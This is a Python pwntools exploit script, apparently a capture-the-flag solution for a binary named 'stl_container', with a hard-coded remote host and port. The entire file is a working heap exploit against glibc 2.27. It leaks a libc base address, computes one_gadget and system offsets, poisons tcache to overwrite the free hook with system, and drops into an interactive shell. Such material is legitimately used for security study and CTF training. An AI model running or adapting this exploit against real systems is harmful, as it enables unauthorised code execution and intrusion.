#!/usr/bin/env python3
# -*- coding: utf-8 -*- 

from pwn import *

BINARY = './stl_container'
ARGS = ''
LIBC = './libc-2.27.so'
HOST  = '134.175.239.26'
PORT = 8848

elf = ELF(BINARY, checksec=False)
#libc = ELF(LIBC, checksec=FALSE)

context.terminal = ['tmux', 'split-w']

#printf = elf.got['printf']             

def get_base_address(proc):
        return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
        script = ""
        for bp in breakpoints:
                script += "b *0x%x\n"%(PIE+bp)
        gdb.attach(process(BINARY), gdbscript=script)

def start():
        if not args.REMOTE:
                print("LOCAL PROCESS")
                return process([BINARY, ARGS], env={"LD_PRELOAD":LIBC}, alarm=0)
        else:
                print("REMOTE PROCESS")
                return remote(HOST, PORT)

def write(addr, value):
        p.sendlineafter("", "1")
        p.sendlineafter("", addr)
        p.sendafter("", value)

def read(addr):
        p.sendlineafter("", "2")
        p.sendafter("", addr)

def add(ds, data):
        p.sendlineafter(">> ", str(ds))
        p.sendlineafter(">> ", "1")
        p.sendafter("data:", data)

def delete(ds, idx):
        p.sendlineafter(">> ", str(ds))
        p.sendlineafter(">> ", "2")
        p.sendlineafter("index?", str(idx))

def delete2(ds):
        p.sendlineafter(">> ", str(ds))
        p.sendlineafter(">> ", "2")

def leak():
    delete2(4)
    delete2(4)
    delete2(3)
    delete2(3)
    delete2(3)
    delete(1, 0)
    delete(1, 0)
    delete(2, 0)
    p.sendlineafter(">> ", "2")
    p.sendlineafter(">> ", "3")
    p.sendlineafter("index?", "0")
    p.recvuntil("data: ")
    leak = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = leak - 0x3ebca0
    return libc_base


one_gad = [0x4f2c5, 0x4f322, 0x10a38c]



p = start()
if args.GDB:
    gdb.attach(p, "b system")

add(1,"A"*0x98)
add(1,"B"*0x98)

add(2, "C"*0x98)
add(2,"D"*0x98)

add(3, "C"*0x98)
add(3,"D"*0x98)

add(4, "E"*0x98)
add(4, "F"*0x98)

libc = leak()
log.info("Leak: {}".format(hex(libc)))
malloc_hook = libc + 0x3ebc28
log.info("__malloc_hook: {}".format(hex(malloc_hook - 0x23)))
one_gadget = libc + one_gad[1]
log.info("one_gadget: {}".format(hex(one_gadget)))
system = libc + 0x4f440
log.info("system: {}".format(hex(system)))
free = libc + 0x3ed8e0


add(1,"A"*0x98)
add(1,"B"*0x98)
add(3, "C"*0x98)
add(3,"D"*0x98)
add(4, "E"*0x98)
add(4, "F"*0x98)
add(2, p64(one_gadget)*2 + b"G"*(0x98 - 8*3) + p64(one_gadget))

delete(2, 0)
delete(2, 0)

#add(2, p64(malloc_hook - 0x23))
#add(2, b"Z"*(0x30-5) + p64(one_gadget))
add(2, p64(free))
add(2, b"cat *\x00\x00\x00" + p64(system))

delete2(4)
add(4, "")

p.interactive()

